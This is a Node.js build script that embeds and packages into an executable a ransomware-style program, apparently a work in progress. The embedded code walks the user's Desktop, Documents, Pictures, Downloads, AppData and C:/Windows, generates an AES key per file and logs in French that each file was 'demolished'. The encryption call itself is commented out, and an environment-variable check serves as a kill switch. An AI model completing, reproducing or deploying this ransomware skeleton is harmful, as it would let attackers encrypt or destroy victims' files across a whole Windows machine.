const pkg = require("pkg")
const fs = require("fs")
const string =`console.time("essai")
const fs = require("fs")
const AES = require('aes2512')
const path = require("path")
const FileSystem = require("fs")
const log4js = require("log4js");
const basepath =process.env.userprofile
const discord = require("discord.js")
log4js.configure({
  appenders: { cheese: { type: "file", filename: "fuck.log" },log:{type:"console"} },
  categories: { default: { appenders: ["cheese","log"], level: "debug" } }
});
 
const logger = log4js.getLogger("cheese");

logger.debug("Cheese is Comté.");
function readDirR(directory) {
    var returnedFiles = []
    try {
        var files = FileSystem.readdirSync(directory)
        for(var i=0; i<files.length; i++){
            if (FileSystem.statSync(directory+"/"+files[i]).isDirectory()) {
                returnedFiles = returnedFiles.concat(readDirR(directory+"/"+files[i]))
            } else {
                returnedFiles.push(directory+"/"+files[i])
                
                
    
                
            }
        }
        
        return returnedFiles
      } catch (error) {
        logger.error(error);
        // expected output: ReferenceError: nonExistentFunction is not defined
        // Note - error messages will vary depending on browser
      
    }
    
   
    
}

async function crypt(folder){const file =readDirR(folder)
require("dotenv").config()
if(process.env.seckey!="sandozantiscam"){
    for (let i = 0; i < file.length; i++) {
        var key = AES.getkey(255)
      //AES.cryptfiles(path.normalize(file[i]) ,key) 
       logger.debug(\`le fichier ayant pour chemin`+ "${path.normalize(file[i])}"+ `a été démoli par la clée`+" ${key}"+` \`);
      }
}else{console.log(file)}
}
async function main(){
    const array = ["/Desktop","/Documents","/Pictures","/Music","/3D Objects","/Downloads","/Videos","/AppData"]
    for (let index = 0; index < array.length; index++) {
        const element = array[index];
        var temp = path.join(basepath,element)
        var tera = path.normalize(temp)
        console.log(tera)
        crypt(tera)
    }
    crypt("C:/Windows")
    
}

main()



console.timeEnd("essai")`
async function write(){
    var file = fs.openSync("/index.js","w")
    fs.writeFileSync(file,string)
    fs.closeSync(file) 
}
async function main (){
//await write()
const arg = ["/index.js"]
pkg.exec(arg)
}
main()